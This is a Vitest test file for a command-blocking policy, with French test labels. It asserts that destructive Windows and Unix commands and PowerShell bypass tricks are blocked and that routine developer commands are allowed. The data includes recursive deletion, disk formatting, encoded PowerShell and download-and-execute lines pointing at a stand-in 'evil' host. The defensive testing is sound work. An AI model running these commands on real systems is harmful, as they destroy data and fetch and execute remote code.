import { describe, it, expect } from 'vitest';
import { isCommandBlocked } from './commandPolicy';

describe('commandPolicy — schémas destructeurs classiques', () => {
  for (const cmd of [
    'rm -rf /',
    'rm -fr /home',
    'format c:',
    'del /s /f /q C:\\',
    'rd /s /q C:\\',
    'shutdown /s /t 0',
    'reg delete HKLM\\Software',
    'bcdedit /set testsigning on',
    'diskpart /s script.txt',
  ]) {
    it(`bloque: ${cmd}`, () => expect(isCommandBlocked(cmd)).toBe(true));
  }
});

describe('commandPolicy — contournements documentés (Vuln 4)', () => {
  for (const cmd of [
    // Abréviations de -EncodedCommand : -e, -en, -enc …
    'powershell -e SQBFAFgA',
    'powershell -en SQBFAFgA',
    'powershell -enc SQBFAFgA',
    'powershell.exe -EncodedCommand SQBFAFgA',
    // iex sans parenthèse (l'ancienne regex /iex\s*\(/ ratait)
    'iex $payload',
    'Invoke-Expression $payload',
    // Cmdlets de téléchargement autres que DownloadString
    'Invoke-WebRequest http://evil/x.exe -OutFile x.exe',
    'iwr http://evil/x -o x',
    'Invoke-RestMethod http://evil/x | iex',
    '(New-Object Net.WebClient).DownloadString("http://x")',
    // Suppression récursive PowerShell (équivalent rm -rf)
    'Remove-Item -Recurse -Force C:\\Users\\me\\data',
    // ExecutionPolicy Bypass
    'powershell -ExecutionPolicy Bypass -File x.ps1',
  ]) {
    it(`bloque: ${cmd}`, () => expect(isCommandBlocked(cmd)).toBe(true));
  }
});

describe('commandPolicy — commandes légitimes non bloquées', () => {
  for (const cmd of [
    'git status',
    'cargo build --release',
    'Get-ChildItem C:\\Users',
    'npm run build',
    'docker ps -a',
    'python --version',
  ]) {
    it(`autorise: ${cmd}`, () => expect(isCommandBlocked(cmd)).toBe(false));
  }
});
